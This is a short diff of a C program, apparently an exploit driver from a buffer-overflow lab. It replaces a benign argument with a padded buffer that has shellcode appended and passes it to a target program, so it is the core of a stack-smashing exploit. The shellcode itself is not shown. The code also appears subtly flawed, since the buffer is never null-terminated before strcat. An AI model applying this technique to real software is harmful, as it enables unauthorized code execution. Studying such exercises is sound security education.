@@ -9,7 +9,9 @@
 
 int main(void)
 {
-	char arg1[] = "Hi there!";
+	char arg1[170];
+	memset(arg1, '0', sizeof(arg1)-37);
+	strcat(arg1, shellcode);
 	char *args[] = { TARGET, arg1, NULL };
 	char *env[] = { NULL };
 
